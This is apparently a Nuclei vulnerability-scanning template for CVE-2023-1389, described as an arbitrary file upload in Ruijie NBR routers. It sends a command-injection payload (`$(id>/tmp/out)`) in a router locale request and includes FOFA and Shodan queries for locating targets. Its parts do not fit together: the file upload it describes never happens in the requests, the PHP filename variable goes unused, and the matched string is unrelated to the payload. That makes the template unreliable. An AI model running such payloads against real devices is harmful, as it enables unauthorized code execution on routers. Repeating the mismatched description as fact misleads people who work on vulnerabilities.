id: CVE-2023-1389

info:
  name: Ruijie NBR - Arbitrary File Upload
  author: Co5mos
  severity: high
  description: |
    Ruijie NBR series routers have an arbitrary file upload vulnerability that allows attackers to construct malicious requests to upload and execute arbitrary PHP files, leading to arbitrary code execution on affected devices. This usually results in full system control.
  classification:
    cvss-metrics: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    cvss-score: 8.8
    cve-id: CVE-2023-1389
    cwe-id: CWE-77
  metadata:
    fofa-query: app="Ruijie-NBR路由器"
    shodan-query: title:"ruijie"
    max-request: 2
    vendor: Ruijie
    product: NBR Router
  tags: cve,cve2023,ruijie,router,arbitrary-file-upload

variables:
  filename: "{{rand_base(6)}}.php"

http:
  - raw:
        - |
          POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded

          operation=write&country=$(id>/tmp/out)

        - |
          GET /{{uploadfile}} HTTP/1.1
          Host: {{Hostname}}

    extractors:
      - type: regex
        part: body
        group: 1
        name: uploadfile
        regex:
          - '\.\./\.\./(\d+/\d+\.php)'
        internal: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '2468642'

      - type: status
        status:
          - 200